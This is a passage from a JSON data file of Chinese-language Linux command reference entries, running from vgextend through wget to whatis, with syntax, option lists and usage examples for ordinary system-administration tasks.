ICprwg-ZmhA-JKYF-WYuy-jNHa-AyCN-ZS5F7B\n```\n\n\n"},{"name":"vgextend","categoryId":0,"data":"vgextend\n\u003d\u003d\u003d\n\n向卷组中添加物理卷\n\n## 补充说明\n\n**vgextend命令** 用于动态扩展LVM卷组，它通过向卷组中添加物理卷来增加卷组的容量。LVM卷组中的物理卷可以在使用vgcreate命令创建卷组时添加，也可以使用vgextend命令动态的添加。\n\n### 语法  \n\n```\nvgextend(选项)(参数)\n```\n\n### 选项  \n\n```\n-d：调试模式；\n-t：仅测试。\n```\n\n### 参数  \n\n*   卷组：指定要操作的卷组名称；\n*   物理卷列表：指定要添加到卷组中的物理卷列表。\n\n### 实例  \n\n使用vgextend命令向卷组\"vg2000\"中添加物理卷。在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# vgextend vg2000 /dev/sdb2     #将物理卷\"/dev/sdb2\"加入卷组\"vg2000\"\n```\n\n输出信息如下：\n\n```\nVolume group \"vg2000\" successfully extended\n```\n\n\n"},{"name":"vgreduce","categoryId":0,"data":"vgreduce\n\u003d\u003d\u003d\n\n从卷组中删除物理卷\n\n## 补充说明\n\n**vgreduce命令** 通过删除LVM卷组中的物理卷来减少卷组容量。不能删除LVM卷组中剩余的最后一个物理卷。\n\n### 语法  \n\n```\nvgreduce(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：如果命令行中没有指定要删除的物理卷，则删除所有的空物理卷；\n--removemissing：删除卷组中丢失的物理卷，使卷组恢复正常状态。\n```\n\n### 参数  \n\n*   卷组：指定要操作的卷组名称；\n*   物理卷列表：指定要删除的物理卷列表。\n\n### 实例  \n\n使用vgreduce命令从卷组\"vg2000\"中移除物理卷`/dev/sdb2`。在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# vgreduce vg2000 /dev/sdb2    #将物理卷\"/dev/sdb2\"从卷组\"vg2000\"中删除\n```\n\n输出信息如下：\n\n```\nRemoved \"/dev/sdb2\" from volume group \"vg2000\"\n```\n\n\n"},{"name":"vgremove","categoryId":0,"data":"vgremove\n\u003d\u003d\u003d\n\n用于用户删除LVM卷组\n\n## 补充说明\n\n**vgremove命令** 用于用户删除LVM卷组。当要删除的卷组上已经创建了逻辑卷时，vgremove命令需要进行确认删除，防止误删除数据。\n\n### 语法  \n\n```\nvgremove(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：强制删除。\n```\n\n### 参数  \n\n卷组：指定要删除的卷组名称。\n\n### 实例  \n\n使用vgremove命令删除LVM卷组\"vg1000\"。在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# vgremove vg1000    #删除卷组\"vg1000\"\nVolume group \"vg1000\" successfully removed\n```\n\n\n"},{"name":"vgscan","categoryId":0,"data":"vgscan\n\u003d\u003d\u003d\n\n扫描并显示系统中的卷组\n\n## 补充说明\n\n**vgscan命令** 查找系统中存在的LVM卷组，并显示找到的卷组列表。vgscan命令仅显示找到的卷组的名称和LVM元数据类型，要得到卷组的详细信息需要使用vgdisplay命令。\n\n### 语法  \n\n```\nvgscan(选项)\n```\n\n### 选项  \n\n```\n-d：调试模式；\n--ignorerlockingfailure：忽略锁定失败的错误。\n```\n\n### 实例  \n\n使用vgscan命令扫描系统中所有的卷组。在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# vgscan     #扫描并显示LVM卷组列表\n```\n\n输出信息如下：\n\n```\nFound volume group \"vg2000\" using metadata type lvm2  \nFound volume group \"vg1000\" using metadata type lvm2 \n```\n\n说明：本例中，vgscan指令找到了两个LVM2卷组\"vg1000\"和\"vg2000\"。\n\n\n"},{"name":"vi","categoryId":1,"data":"vi\n\u003d\u003d\u003d\n\n功能强大的纯文本编辑器\n\n## 补充说明\n\n**vi命令** 是UNIX操作系统和类UNIX操作系统中最通用的全屏幕纯文本编辑器。Linux中的vi编辑器叫vim，它是vi的增强版（vi Improved），与vi编辑器完全兼容，而且实现了很多增强功能。\n\nvi编辑器支持编辑模式和命令模式，编辑模式下可以完成文本的编辑功能，命令模式下可以完成对文件的操作命令，要正确使用vi编辑器就必须熟练掌握着两种模式的切换。默认情况下，打开vi编辑器后自动进入命令模式。从编辑模式切换到命令模式使用“esc”键，从命令模式切换到编辑模式使用“A”、“a”、“O”、“o”、“I”、“i”键。\n\nvi编辑器提供了丰富的内置命令，有些内置命令使用键盘组合键即可完成，有些内置命令则需要以冒号“：”开头输入。常用内置命令如下：\n\n```\nCtrl+u：向文件首翻半屏；\nCtrl+d：向文件尾翻半屏；\nCtrl+f：向文件尾翻一屏；\nCtrl+b：向文件首翻一屏；\nEsc：从编辑模式切换到命令模式；\nZZ：命令模式下保存当前文件所做的修改后退出vi；\n:行号：光标跳转到指定行的行首；\n:$：光标跳转到最后一行的行首；\nx或X：删除一个字符，x删除光标后的，而X删除光标前的；\nD：删除从当前光标到光标所在行尾的全部字符；\ndd：删除光标行正行内容；\nndd：删除当前行及其后n-1行；\nnyy：将当前行及其下n行的内容保存到寄存器？中，其中？为一个字母，n为一个数字；\np：粘贴文本操作，用于将缓存区的内容粘贴到当前光标所在位置的下方；\nP：粘贴文本操作，用于将缓存区的内容粘贴到当前光标所在位置的上方；\n/字符串：文本查找操作，用于从当前光标所在位置开始向文件尾部查找指定字符串的内容，查找的字符串会被加亮显示；\n？name：文本查找操作，用于从当前光标所在位置开始向文件头部查找指定字符串的内容，查找的字符串会被加亮显示；\na，bs/F/T：替换文本操作，用于在第a行到第b行之间，将F字符串换成T字符串。其中，“s/”表示进行替换操作；\na：在当前字符后添加文本；\nA：在行末添加文本；\ni：在当前字符前插入文本；\nI：在行首插入文本；\no：在当前行后面插入一空行；\nO：在当前行前面插入一空行；\n:wq：在命令模式下，执行存盘退出操作；\n:w：在命令模式下，执行存盘操作；\n:w！：在命令模式下，执行强制存盘操作；\n:q：在命令模式下，执行退出vi操作；\n:q！：在命令模式下，执行强制退出vi操作；\n:e文件名：在命令模式下，打开并编辑指定名称的文件；\n:n：在命令模式下，如果同时打开多个文件，则继续编辑下一个文件；\n:f：在命令模式下，用于显示当前的文件名、光标所在行的行号以及显示比例；\n:set number：在命令模式下，用于在最左端显示行号；\n:set nonumber：在命令模式下，用于在最左端不显示行号；\n```\n\n### 语法  \n\n```\nvi(选项)(参数)\n```\n\n### 选项  \n\n```\n+\u003c行号\u003e：从指定行号的行开始先是文本内容；\n-b：以二进制模式打开文件，用于编辑二进制文件和可执行文件；\n-c\u003c指令\u003e：在完成对第一个文件编辑任务后，执行给出的指令；\n-d：以diff模式打开文件，当多个文件编辑时，显示文件差异部分；\n-l：使用lisp模式，打开“lisp”和“showmatch”；\n-m：取消写文件功能，重设“write”选项；\n-M：关闭修改功能；\n-n：不实用缓存功能；\n-o\u003c文件数目\u003e：指定同时打开指定数目的文件；\n-R：以只读方式打开文件；\n-s：安静模式，不现实指令的任何错误信息。\n```\n\n### 参数  \n\n文件列表：指定要编辑的文件列表。多个文件之间使用空格分隔开。\n\n## 知识扩展  \n\nvi编辑器有三种工作方式：命令方式、输入方式和ex转义方式。通过相应的命令或操作，在这三种工作方式之间可以进行转换。\n\n **命令方式** \n\n在Shell提示符后输入命令vi，进入vi编辑器，并处于vi的命令方式。此时，从键盘上输入的任何字符都被作为编辑命令来解释，例如，a(append）表示附加命令，i(insert）表示插入命令，x表示删除字符命令等。如果输入的字符不是vi的合法命令，则机器发出“报警声”，光标不移动。另外，在命令方式下输入的字符（即vi命令）并不在屏幕上显示出来，例如，输入i，屏幕上并无变化，但通过执行i命令，编辑器的工作方式却发生变化：由命令方式变为输入方式。\n\n **输入方式** \n\n通过输入vi的插入命令（i）、附加命令（a）、打开命令（o）、替换命令（s）、修改命令(c）或取代命令（r）可以从命令方式进入输入方式。在输入方式下，从键盘上输入的所有字符都被插入到正在编辑的缓冲区中，被当做该文件的正文。进入输入方式后，输入的可见字符都在屏幕上显示出来，而编辑命令不再起作用，仅作为普通字母出现。例如，在命令方式下输入字母i，进到输入方式，然后再输入i，就在屏幕上相应光标处添加一个字母i。\n\n由输入方式回到命令方式的办法是按下Esc键。如果已在命令方式下，那么按下Esc键就会发出“嘟嘟”声。为了确保用户想执行的vi命令是在命令方式下输入的，不妨多按几下Esc键，听到嘟声后再输入命令。\n\n **ex转义方式** \n\nvi和ex编辑器的功能是相同的，二者的主要区别是用户界面。在vi中，命令通常是单个字母，如a,x,r等。而在ex中，命令是以Enter；键结束的命令行。vi有一个专门的“转义”命令，可访问很多面向行的ex命令。为使用ex转义方式，可输入一个冒号（:）。作为ex命令提示符，冒号出现在状态行（通常在屏幕最下一行）。按下中断键（通常是Del键），可终止正在执行的命令。多数文件管理命令都是在ex转义方式下执行的（例如，读取文件，把编辑缓冲区的内容写到文件中等）。转义命令执行后，自动回到命令方式。例如：\n\n```\n:1,$s/I/i/g 按Enter键\n```\n\n则从文件第一行至文件末尾（$）将大写I全部替换成小写i。vi编辑器的三种工作方式之间的转换如图所示。\n\n!vi\n\n\n"},{"name":"vmstat","categoryId":0,"data":"vmstat\n\u003d\u003d\u003d\n\n显示虚拟内存状态\n\n## 补充说明\n\n**vmstat命令** 的含义为显示虚拟内存状态（“Viryual Memor Statics”），但是它可以报告关于进程、内存、I/O等系统整体运行状态。\n\n### 语法  \n\n```\nvmstat(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：显示活动内页；\n-f：显示启动后创建的进程总数；\n-m：显示slab信息；\n-n：头信息仅显示一次；\n-s：以表格方式显示事件计数器和内存状态；\n-d：报告磁盘状态；\n-p：显示指定的硬盘分区状态；\n-S：输出信息的单位。\n```\n\n### 参数  \n\n*   事件间隔：状态信息刷新的时间间隔；\n*   次数：显示报告的次数。\n\n### 实例  \n\n```\nvmstat 3\nprocs -----------memory---------- ---swap-- -----io---- --system-- -----cpu------\n r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st\n 0  0    320  42188 167332 1534368    0    0     4     7    1    0  0  0 99  0  0\n 0  0    320  42188 167332 1534392    0    0     0     0 1002   39  0  0 100  0  0\n 0  0    320  42188 167336 1534392    0    0     0    19 1002   44  0  0 100  0  0\n 0  0    320  42188 167336 1534392    0    0     0     0 1002   41  0  0 100  0  0\n 0  0    320  42188 167336 1534392    0    0     0     0 1002   41  0  0 100  0  0\n\n```\n\n **字段说明：** \n\nProcs（进程）\n\n*   r: 运行队列中进程数量，这个值也可以判断是否需要增加CPU。（长期大于1）\n*   b: 等待IO的进程数量。\n\nMemory（内存）\n\n*   swpd: 使用虚拟内存大小，如果swpd的值不为0，但是SI，SO的值长期为0，这种情况不会影响系统性能。\n*   free: 空闲物理内存大小。\n*   buff: 用作缓冲的内存大小。\n*   cache: 用作缓存的内存大小，如果cache的值大的时候，说明cache处的文件数多，如果频繁访问到的文件都能被cache处，那么磁盘的读IO bi会非常小。\n\nSwap\n\n*   si: 每秒从交换区写到内存的大小，由磁盘调入内存。\n*   so: 每秒写入交换区的内存大小，由内存调入磁盘。\n\n注意：内存够用的时候，这2个值都是0，如果这2个值长期大于0时，系统性能会受到影响，磁盘IO和CPU资源都会被消耗。有些朋友看到空闲内存（free）很少的或接近于0时，就认为内存不够用了，不能光看这一点，还要结合si和so，如果free很少，但是si和so也很少（大多时候是0），那么不用担心，系统性能这时不会受到影响的。\n\nIO（现在的Linux版本块的大小为1kb）\n\n*   bi: 每秒读取的块数\n*   bo: 每秒写入的块数\n\n注意：随机磁盘读写的时候，这2个值越大（如超出1024k)，能看到CPU在IO等待的值也会越大。\n\nsystem（系统）\n\n*   in: 每秒中断数，包括时钟中断。\n*   cs: 每秒上下文切换数。\n\n注意：上面2个值越大，会看到由内核消耗的CPU时间会越大。\n\nCPU（以百分比表示）\n\n*   us: 用户进程执行时间百分比(user time)\n\nus的值比较高时，说明用户进程消耗的CPU时间多，但是如果长期超50%的使用，那么我们就该考虑优化程序算法或者进行加速。\n\n*   sy: 内核系统进程执行时间百分比(system time)\n\nsy的值高时，说明系统内核消耗的CPU资源多，这并不是良性表现，我们应该检查原因。\n\n*   wa: IO等待时间百分比\n\nwa的值高时，说明IO等待比较严重，这可能由于磁盘大量作随机访问造成，也有可能磁盘出现瓶颈（块操作）。\n\n*   id: 空闲时间百分比\n\n\n"},{"name":"volname","categoryId":0,"data":"volname\n\u003d\u003d\u003d\n\n显示指定的ISO-9660格式的设备的卷名称\n\n## 补充说明\n\n**volname命令** 用于显示指定的“ISO-9660”格式的设备的卷名称，通常这种格式的设备为光驱。\n\n### 语法  \n\n```\nvolname(参数)\n```\n\n### 参数  \n\n设备文件名：指定要显示卷名称的设备。\n\n\n"},{"name":"w","categoryId":2,"data":"w\n\u003d\u003d\u003d\n\n显示目前登入系统的用户信息\n\n## 补充说明\n\n**w命令** 用于显示已经登陆系统的用户列表，并显示用户正在执行的指令。执行这个命令可得知目前登入系统的用户有那些人，以及他们正在执行的程序。单独执行w命令会显示所有的用户，您也可指定用户名称，仅显示某位用户的相关信息。\n\n### 语法  \n\n```\nw(选项)(参数)\n```\n\n### 选项  \n\n```\n-h：不打印头信息；\n-u：当显示当前进程和cpu时间时忽略用户名；\n-s：使用短输出格式；\n-f：显示用户从哪登录；\n-V：显示版本信息。\n```\n\n### 参数  \n\n用户：仅显示指定用户。\n\n### 实例  \n\n```\nw\n 20:39:37 up 136 days,  3:58,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              login@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    222.94.97.122    20:39    1.00s  0.00s  0.00s w\n```\n\n\n"},{"name":"wait","categoryId":0,"data":"wait\n\u003d\u003d\u003d\n\n等待进程执行完后返回\n\n## 补充说明\n\n**wait命令** 用来等待指令的指令，直到其执行完毕后返回终端。该指令常用于shell脚本编程中，待指定的指令执行完成后，才会继续执行后面的任务。该指令等待作业时，在作业标识号前必须添加备份号\"%\"。\n\n### 语法  \n\n```\nwait(参数)\n```\n\n### 参数  \n\n进程或作业标示：指定进程号或者作业号。\n\n### 实例  \n\n使用命令wait等待作业号为1的作业完成后再返回，输入如下命令：\n\n```\nwait %1       #等待作业号为3的作业完成 \n```\n\n执行上面的指令后，将输出指定作业号的指令，如下所示：\n\n```\nfind / -name password\n```\n\n\n"},{"name":"wall","categoryId":0,"data":"wall\n\u003d\u003d\u003d\n\n向系统当前所有打开的终端上输出信息\n\n## 补充说明\n\n**wall命令** 用于向系统当前所有打开的终端上输出信息。通过wall命令可将信息发送给每位同意接收公众信息的终端机用户，若不给予其信息内容，则wall命令会从标准输入设备读取数据，然后再把所得到的数据传送给所有终端机用户。\n\n### 语法  \n\n```\nwall(参数)\n```\n\n### 参数  \n\n消息：指定广播消息。\n\n### 实例  \n\n```\n[root@localhost ~]# wall this is a test line\n\nBroadcast message from root (pts/1) (Fri Dec 20 11:36:51 2013):\n\nthis is a test line\n```\n\n\n"},{"name":"watch","categoryId":0,"data":"watch\n\u003d\u003d\u003d\n\n可以将命令的输出结果输出到标准输出设备，多用于周期性执行命令/定时执行命令\n\n## 补充说明\n\n**watch命令** 以周期性的方式执行给定的指令，指令输出以全屏方式显示。watch是一个非常实用的命令，基本所有的Linux发行版都带有这个小工具，如同名字一样，watch可以帮你监测一个命令的运行结果，省得你一遍遍的手动运行。\n\n### 语法  \n\n```\nwatch(选项)(参数)\n```\n\n### 选项  \n\n```bash\n-n # 或--interval  watch缺省每2秒运行一下程序，可以用-n或-interval来指定间隔的时间。\n-d # 或--differences  用-d或--differences 选项watch 会高亮显示变化的区域。 而-d\u003dcumulative选项会把变动过的地方(不管最近的那次有没有变动)都高亮显示出来。\n-t # 或-no-title  会关闭watch命令在顶部的时间间隔,命令，当前时间的输出。\n-h, --help # 查看帮助文档\n```\n\n### 参数  \n\n指令：需要周期性执行的指令。\n\n### 实例  \n\n```bash\nwatch -n 1 -d netstat -ant       # 命令：每隔一秒高亮显示网络链接数的变化情况\nwatch -n 1 -d \u0027pstree|grep http\u0027 # 每隔一秒高亮显示http链接数的变化情况。 后面接的命令若带有管道符，需要加\u0027\u0027将命令区域归整。\nwatch \u0027netstat -an | grep:21 | \\ grep\u003c模拟攻击客户机的IP\u003e| wc -l\u0027 # 实时查看模拟攻击客户机建立起来的连接数\nwatch -d \u0027ls -l|grep scf\u0027       # 监测当前目录中 scf\u0027 的文件的变化\nwatch -n 10 \u0027cat /proc/loadavg\u0027 # 10秒一次输出系统的平均负载\nwatch uptime\nwatch -t uptime\nwatch -d -n 1 netstat -ntlp\nwatch -d \u0027ls -l | fgrep goface\u0027     # 监测goface的文件\nwatch -t -differences\u003dcumulative uptime\nwatch -n 60 from            # 监控mail\nwatch -n 1 \"df -i;df\"       # 监测磁盘inode和block数目变化情况\n```\n\nFreeBSD和Linux下watch命令的不同，在Linux下，watch是周期性的执行下个程序，并全屏显示执行结果，如：`watch -n 1 -d netstat -ant`，而在FreeBSD下的watch命令是查看其它用户的正在运行的操作，watch允许你偷看其它terminal正在做什么，该命令只能让超级用户使用。\n\n\n\n"},{"name":"wc","categoryId":1,"data":"wc\n\u003d\u003d\u003d\n\n统计文件的字节数、字数、行数\n\n## 补充说明\n\n**wc命令** 统计指定文件中的字节数、字数、行数，并将统计结果显示输出。利用wc指令我们可以计算文件的Byte数、字数或是列数，若不指定文件名称，或是所给予的文件名为“-”，则wc指令会从标准输入设备读取数据。wc同时也给出所指定文件的总统计数。\n\n### 语法  \n\n```\nwc(选项)(参数)\n```\n\n### 选项  \n\n```bash\n-c # 统计字节数，或--bytes或——chars：只显示Bytes数；。\n-l # 统计行数，或——lines：只显示列数；。\n-m # 统计字符数。这个标志不能与 -c 标志一起使用。\n-w # 统计字数，或——words：只显示字数。一个字被定义为由空白、跳格或换行字符分隔的字符串。\n-L # 打印最长行的长度。\n-help     # 显示帮助信息\n--version # 显示版本信息\n```\n\n### 参数  \n\n文件：需要统计的文件列表。\n\n## 例子\n\n```bash\nwc -l *       # 统计当前目录下的所有文件行数\nwc -l *.js    # 统计当前目录下的所有 .js 后缀的文件行数\nfind  . * | xargs wc -l # 当前目录以及子目录的所有文件行数 \nwc test.txt   # 查看文件的字节数、字数、行数\n```\n\n查看文件的字节数、字数、行数\n\n```bash\nwc test.txt\n# 输出结果\n7     8     70     test.txt\n行数 单词数 字节数 文件名\n```\n\n用wc命令怎么做到只打印统计数字不打印文件名\n\n```bash\nwc -l test.txt \n# 输出结果\n7 test.txt\n```\n\n用来统计当前目录下的文件数\n\n```bash\nls -l | wc -l\n# 输出结果\n8\n```\n\n\n"},{"name":"wget","categoryId":0,"data":"wget\n\u003d\u003d\u003d\n\nLinux系统下载文件工具\n\n## 补充说明\n\n**wget命令** 用来从指定的URL下载文件。wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。\n\nwget支持HTTP，HTTPS和FTP协议，可以使用HTTP代理。所谓的自动下载是指，wget可以在用户退出系统的之后在后台执行。这意味这你可以登录系统，启动一个wget下载任务，然后退出系统，wget将在后台执行直到任务完成，相对于其它大部分浏览器在下载大量数据时需要用户一直的参与，这省去了极大的麻烦。\n\n用于从网络上下载资源，没有指定目录，下载资源回默认为当前目录。wget虽然功能强大，但是使用起来还是比较简单：\n\n1. **支持断点下传功能** 这一点，也是网络蚂蚁和FlashGet当年最大的卖点，现在，Wget也可以使用此功能，那些网络不是太好的用户可以放心了；\n2. **同时支持FTP和HTTP下载方式** 尽管现在大部分软件可以使用HTTP方式下载，但是，有些时候，仍然需要使用FTP方式下载软件；\n3. **支持代理服务器** 对安全强度很高的系统而言，一般不会将自己的系统直接暴露在互联网上，所以，支持代理是下载软件必须有的功能；\n4. **设置方便简单** 可能，习惯图形界面的用户已经不是太习惯命令行了，但是，命令行在设置上其实有更多的优点，最少，鼠标可以少点很多次，也不要担心是否错点鼠标；\n5. **程序小，完全免费** 程序小可以考虑不计，因为现在的硬盘实在太大了；完全免费就不得不考虑了，即使网络上有很多所谓的免费软件，但是，这些软件的广告却不是我们喜欢的。\n\n\n### 语法  \n\n```\nwget [参数] [URL地址]\n```\n\n### 选项  \n\n```\n启动参数：\n\n-V, –version 显示wget的版本后退出\n-h, –help 打印语法帮助\n-b, –background 启动后转入后台执行\n-e, –execute\u003dCOMMAND 执行`.wgetrc’格式的命令，wgetrc格式参见/etc/wgetrc或~/.wgetrc\n\n记录和输入文件参数：\n\n-o, –output-file\u003dFILE 把记录写到FILE文件中\n-a, –append-output\u003dFILE 把记录追加到FILE文件中\n-d, –debug 打印调试输出\n-q, –quiet 安静模式(没有输出)\n-v, –verbose 冗长模式(这是缺省设置)\n-nv, –non-verbose 关掉冗长模式，但不是安静模式\n-i, –input-file\u003dFILE 下载在FILE文件中出现的URLs\n-F, –force-html 把输入文件当作HTML格式文件对待\n-B, –base\u003dURL 将URL作为在-F -i参数指定的文件中出现的相对链接的前缀\n–sslcertfile\u003dFILE 可选客户端证书\n–sslcertkey\u003dKEYFILE 可选客户端证书的KEYFILE\n–egd-file\u003dFILE 指定EGD socket的文件名\n\n下载参数：\n\n–bind-address\u003dADDRESS 指定本地使用地址(主机名或IP，当本地有多个IP或名字时使用)\n-t, –tries\u003dNUMBER 设定最大尝试链接次数(0 表示无限制).\n-O –output-document\u003dFILE 把文档写到FILE文件中\n-nc, –no-clobber 不要覆盖存在的文件或使用.#前缀\n-c, –continue 接着下载没下载完的文件\n–progress\u003dTYPE 设定进程条标记\n-N, –timestamping 不要重新下载文件除非比本地文件新\n-S, –server-response 打印服务器的回应\n–spider 不下载任何东西\n-T, –timeout\u003dSECONDS 设定响应超时的秒数\n-w, –wait\u003dSECONDS 两次尝试之间间隔SECONDS秒\n–waitretry\u003dSECONDS 在重新链接之间等待1…SECONDS秒\n–random-wait 在下载之间等待0…2*WAIT秒\n-Y, –proxy\u003don/off 打开或关闭代理\n-Q, –quota\u003dNUMBER 设置下载的容量限制\n–limit-rate\u003dRATE 限定下载输率\n\n目录参数：\n\n-nd –no-directories 不创建目录\n-x, –force-directories 强制创建目录\n-nH, –no-host-directories 不创建主机目录\n-P, –directory-prefix\u003dPREFIX 将文件保存到目录 PREFIX/…\n–cut-dirs\u003dNUMBER 忽略 NUMBER层远程目录\n\nHTTP 选项参数：\n\n–http-user\u003dUSER 设定HTTP用户名为 USER.\n–http-passwd\u003dPASS 设定http密码为 PASS\n-C, –cache\u003don/off 允许/不允许服务器端的数据缓存 (一般情况下允许)\n-E, –html-extension 将所有text/html文档以.html扩展名保存\n–ignore-length 忽略 `Content-Length’头域\n–header\u003dSTRING 在headers中插入字符串 STRING\n–proxy-user\u003dUSER 设定代理的用户名为 USER\n–proxy-passwd\u003dPASS 设定代理的密码为 PASS\n–referer\u003dURL 在HTTP请求中包含 `Referer: URL’头\n-s, –save-headers 保存HTTP头到文件\n-U, –user-agent\u003dAGENT 设定代理的名称为 AGENT而不是 Wget/VERSION\n–no-http-keep-alive 关闭 HTTP活动链接 (永远链接)\n–cookies\u003doff 不使用 cookies\n–load-cookies\u003dFILE 在开始会话前从文件 FILE中加载cookie\n–save-cookies\u003dFILE 在会话结束后将 cookies保存到 FILE文件中\n\nFTP 选项参数：\n\n-nr, –dont-remove-listing 不移走 `.listing’文件\n-g, –glob\u003don/off 打开或关闭文件名的 globbing机制\n–passive-ftp 使用被动传输模式 (缺省值).\n–active-ftp 使用主动传输模式\n–retr-symlinks 在递归的时候，将链接指向文件(而不是目录)\n\n递归下载参数：\n\n-r, –recursive 递归下载－－慎用!\n-l, –level\u003dNUMBER 最大递归深度 (inf 或 0 代表无穷)\n–delete-after 在现在完毕后局部删除文件\n-k, –convert-links 转换非相对链接为相对链接\n-K, –backup-converted 在转换文件X之前，将之备份为 X.orig\n-m, –mirror 等价于 -r -N -l inf -nr\n-p, –page-requisites 下载显示HTML文件的所有图片\n\n递归下载中的包含和不包含(accept/reject)：\n\n-A, –accept\u003dLIST 分号分隔的被接受扩展名的列表\n-R, –reject\u003dLIST 分号分隔的不被接受的扩展名的列表\n-D, –domains\u003dLIST 分号分隔的被接受域的列表\n–exclude-domains\u003dLIST 分号分隔的不被接受的域的列表\n–follow-ftp 跟踪HTML文档中的FTP链接\n–follow-tags\u003dLIST 分号分隔的被跟踪的HTML标签的列表\n-G, –ignore-tags\u003dLIST 分号分隔的被忽略的HTML标签的列表\n-H, –span-hosts 当递归时转到外部主机\n-L, –relative 仅仅跟踪相对链接\n-I, –include-directories\u003dLIST 允许目录的列表\n-X, –exclude-directories\u003dLIST 不被包含目录的列表\n-np, –no-parent 不要追溯到父目录\nwget -S –spider url 不下载只显示过程\n```\n\n### 参数  \n\nURL：下载指定的URL地址。\n\n### 实例  \n\n **使用wget下载单个文件** \n\n```\nwget http://www.jsdig.com/testfile.zip\n```\n\n以下的例子是从网络下载一个文件并保存在当前目录，在下载的过程中会显示进度条，包含（下载完成百分比，已经下载的字节，当前下载速度，剩余下载时间）。\n\n **下载并以不同的文件名保存** \n\n```\nwget -O wordpress.zip http://www.jsdig.com/download.aspx?id\u003d1080\n```\n\nwget默认会以最后一个符合`/`的后面的字符来命令，对于动态链接的下载通常文件名会不正确。\n\n错误：下面的例子会下载一个文件并以名称`download.aspx?id\u003d1080`保存:\n\n```\nwget http://www.jsdig.com/download?id\u003d1\n```\n\n即使下载的文件是zip格式，它仍然以`download.php?id\u003d1080`命令。\n\n正确：为了解决这个问题，我们可以使用参数`-O`来指定一个文件名：\n\n```\nwget -O wordpress.zip http://www.jsdig.com/download.aspx?id\u003d1080\n```\n\n **wget限速下载** \n\n```\nwget --limit-rate\u003d300k http://www.jsdig.com/testfile.zip\n```\n\n当你执行wget的时候，它默认会占用全部可能的宽带下载。但是当你准备下载一个大文件，而你还需要下载其它文件时就有必要限速了。\n\n **使用wget断点续传** \n\n```\nwget -c http://www.jsdig.com/testfile.zip\n```\n\n使用`wget -c`重新启动下载中断的文件，对于我们下载大文件时突然由于网络等原因中断非常有帮助，我们可以继续接着下载而不是重新下载一个文件。需要继续中断的下载时可以使用`-c`参数。\n\n **使用wget后台下载** \n\n```\nwget -b http://www.jsdig.com/testfile.zip\n\nContinuing in background, pid 1840.\nOutput will be written to `wget-log\u0027.\n```\n\n对于下载非常大的文件的时候，我们可以使用参数`-b`进行后台下载，你可以使用以下命令来察看下载进度：\n\n```\ntail -f wget-log\n```\n\n **伪装代理名称下载** \n\n```\nwget --user-agent\u003d\"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16\" http://www.jsdig.com/testfile.zip\n```\n\n有些网站能通过根据判断代理名称不是浏览器而拒绝你的下载请求。不过你可以通过`--user-agent`参数伪装。\n\n **测试下载链接** \n\n当你打算进行定时下载，你应该在预定时间测试下载链接是否有效。我们可以增加`--spider`参数进行检查。\n\n```\nwget --spider URL\n```\n\n如果下载链接正确，将会显示:\n\n```\nSpider mode enabled. Check if remote file exists.\nHTTP request sent, awaiting response... 200 OK\nLength: unspecified [text/html]\nRemote file exists and could contain further links,\nbut recursion is disabled -- not retrieving.\n```\n\n这保证了下载能在预定的时间进行，但当你给错了一个链接，将会显示如下错误:\n\n```\nwget --spider url\nSpider mode enabled. Check if remote file exists.\nHTTP request sent, awaiting response... 404 Not Found\nRemote file does not exist -- broken link!!!\n```\n\n你可以在以下几种情况下使用`--spider`参数：\n\n*   定时下载之前进行检查\n*   间隔检测网站是否可用\n*   检查网站页面的死链接\n\n **增加重试次数** \n\n```\nwget --tries\u003d40 URL\n```\n\n如果网络有问题或下载一个大文件也有可能失败。wget默认重试20次连接下载文件。如果需要，你可以使用`--tries`增加重试次数。\n\n **下载多个文件** \n\n```\nwget -i filelist.txt\n```\n\n首先，保存一份下载链接文件：\n\n```\ncat \u003e filelist.txt\nurl1\nurl2\nurl3\nurl4\n```\n\n接着使用这个文件和参数`-i`下载。\n\n **镜像网站** \n\n```\nwget --mirror -p --convert-links -P ./LOCAL URL\n```\n\n下载整个网站到本地。\n\n*   `--miror`开户镜像下载。\n*   `-p`下载所有为了html页面显示正常的文件。\n*   `--convert-links`下载后，转换成本地的链接。\n*   `-P ./LOCAL`保存所有文件和目录到本地指定目录。\n\n **过滤指定格式下载** \n\n```\nwget --reject\u003dgif ur\n```\n\n下载一个网站，但你不希望下载图片，可以使用这条命令。\n\n **把下载信息存入日志文件** \n\n```\nwget -o download.log URL\n```\n\n不希望下载信息直接显示在终端而是在一个日志文件，可以使用。\n\n **限制总下载文件大小** \n\n```\nwget -Q5m -i filelist.txt\n```\n\n当你想要下载的文件超过5M而退出下载，你可以使用。注意：这个参数对单个文件下载不起作用，只能递归下载时才有效。\n\n **下载指定格式文件** \n\n```\nwget -r -A.pdf url\n```\n\n可以在以下情况使用该功能：\n\n*   下载一个网站的所有图片。\n*   下载一个网站的所有视频。\n*   下载一个网站的所有PDF文件。\n\n **FTP下载** \n\n```\nwget ftp-url\nwget --ftp-user\u003dUSERNAME --ftp-password\u003dPASSWORD url\n```\n\n可以使用wget来完成ftp链接的下载。\n\n使用wget匿名ftp下载：\n\n```\nwget ftp-url\n```\n\n使用wget用户名和密码认证的ftp下载：\n\n```\nwget --ftp-user\u003dUSERNAME --ftp-password\u003dPASSWORD url\n```\n\n\n"},{"name":"whatis","categoryId":0,"data":"whatis\n\u003d\u003d\u003d\n\n查询一个命令执行什么功能\n\n## 补充说明\n\n**whatis命令** 是用于查询一个命令执行什么功能，并将查询结果打印到终端上。\n\nwhatis命令在用`catman -w`命令创建的数据库中查找command参数指定的命令、系统调用、库函数或特殊文件名。whatis命令显示手册部分的页眉行。然后可以发出man命令以获取附加的信息。whatis命令等同于使用`man -f`命令。\n\n### 语法  